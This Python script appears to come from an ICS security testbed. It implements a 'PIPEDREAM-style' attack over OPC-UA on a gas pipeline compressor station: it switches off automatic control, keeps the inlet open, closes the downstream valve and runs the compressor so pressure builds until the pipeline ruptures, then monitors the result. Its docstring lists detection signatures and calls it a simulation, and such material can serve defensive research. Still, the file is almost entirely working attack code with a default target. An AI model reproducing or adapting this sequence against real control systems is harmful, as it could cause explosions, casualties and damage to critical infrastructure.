#!/usr/bin/env python3
"""
Gas Pipeline Overpressure Attack

PIPEDREAM-style attack against gas pipeline compressor station:
1. Close downstream valve
2. Increase compressor speed to maximum
3. Pressure builds in closed system
4. Pipeline rupture

This simulates attacks against pipeline SCADA systems
that could cause catastrophic physical damage.
"""

import logging
import time
import sys

# Setup logging BEFORE imports
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)

try:
    from .opcua_attack import OPCUAAttack
except ImportError:
    from opcua_attack import OPCUAAttack

logger = logging.getLogger('AttackGasPipeline')
logger.setLevel(logging.INFO)


class AttackGasPipeline(OPCUAAttack):
    """
    Gas Pipeline Overpressure Attack

    Attack strategy:
    - Close downstream valve (trap pressure)
    - Keep upstream valve open (maintain supply)
    - Increase compressor speed to 100%
    - Pressure builds rapidly
    - Pipeline ruptures at pressure limit

    Detection signatures:
    - Downstream valve closed while compressor running
    - Compressor speed increased to maximum
    - Outlet pressure rising rapidly
    - High pressure alarm triggered
    - Temperature increase from compression
    """

    def get_process_name(self) -> str:
        return "GasPipeline"

    def get_attack_name(self) -> str:
        return "Gas Pipeline Overpressure/Rupture"

    def get_expected_effect(self) -> str:
        return "Pressure builds in closed pipeline, leading to rupture at 1500 PSI"

    def execute_attack(self) -> bool:
        """Execute the gas pipeline attack"""

        # Node names match the OPC-UA adapter's WaterTankProtocolMapper schema:
        # InletValveCommand = upstream (gas inlet), OutletValveCommand = downstream (gas outlet)
        # PumpCommand = compressor, Pressure = outlet pressure

        # Read initial pressure
        initial_pressure = self.read_node('Measurements.Pressure') or 0.0
        logger.info(f"[*] Initial outlet pressure: {initial_pressure:.1f} bar")

        # Step 1: Disable auto mode so manual commands take effect
        logger.warning("[ATTACK] Step 1: Switching to manual mode...")
        self.write_node('Commands.AutoModeCommand', False)
        time.sleep(0.5)

        # Step 2: Ensure upstream (inlet) valve is open - gas supply continues
        logger.warning("[ATTACK] Step 2: Ensuring upstream valve is open...")
        logger.info("         Gas supply must continue for pressure buildup")

        self.write_node('Commands.InletValveCommand', True)
        time.sleep(0.5)

        # Step 3: Close downstream (outlet) valve - trap gas in section
        logger.warning("[ATTACK] Step 3: Closing downstream valve...")
        logger.info("         Trapping gas in the pipeline section")

        success = self.write_node('Commands.OutletValveCommand', False)
        if not success:
            logger.error("[-] Failed to close downstream valve")
            return False

        time.sleep(0.5)

        # Step 4: Ensure compressor is running at maximum
        logger.warning("[ATTACK] Step 4: Setting compressor to MAXIMUM...")
        logger.info("         Compressor will rapidly increase pressure")

        success = self.write_node('Commands.PumpCommand', True)
        if not success:
            logger.error("[-] Failed to start compressor")
            return False

        logger.warning("\n[!] ATTACK SEQUENCE COMPLETE")
        logger.warning("[!] Pipeline pressure is now building")
        logger.warning("[!] Expected sequence:")
        logger.warning("    1. Outlet pressure increases rapidly")
        logger.warning("    2. Temperature increases from compression")
        logger.warning("    3. High pressure alarm triggers")
        logger.warning("    4. Pipeline rupture (TankExploded flag)")

        # Monitor pressure buildup
        logger.info("\n[*] Monitoring pressure buildup...")
        for i in range(10):
            time.sleep(1)
            pressure = self.read_node('Measurements.Pressure') or 0.0
            temp = self.read_node('Measurements.Temperature') or 0.0
            high_pressure = self.read_node('Alarms.AlarmHighPressure')
            rupture = self.read_node('Status.TankExploded')

            logger.info(f"    Pressure: {pressure:.1f} bar | Temp: {temp:.1f}C | HP Alarm: {high_pressure}")

            if rupture:
                logger.warning("\n[!] PIPELINE RUPTURE DETECTED!")
                logger.warning(f"    Final pressure: {pressure:.1f} bar")
                break

            if high_pressure:
                logger.warning(f"    [!] HIGH PRESSURE ALARM TRIGGERED at {pressure:.1f} bar")

        return True


def main():
    """Test the gas pipeline attack"""
    import argparse

    parser = argparse.ArgumentParser(description='Gas Pipeline Attack')
    parser.add_argument('--target', default='192.168.1.6', help='Target IP (default: 192.168.1.6)')
    parser.add_argument('--port', type=int, default=4840, help='OPC-UA port')

    args = parser.parse_args()

    attack = AttackGasPipeline(args.target, args.port)
    result = attack.run()

    print("\n" + "=" * 60)
    print("ATTACK RESULT")
    print("=" * 60)
    print(f"Success: {result.success}")
    print(f"Process: {result.process}")
    print(f"Attack: {result.attack_type}")
    print(f"Commands Sent: {result.commands_sent}")
    print(f"Duration: {result.duration:.2f}s")
    print("=" * 60)


if __name__ == '__main__':
    main()
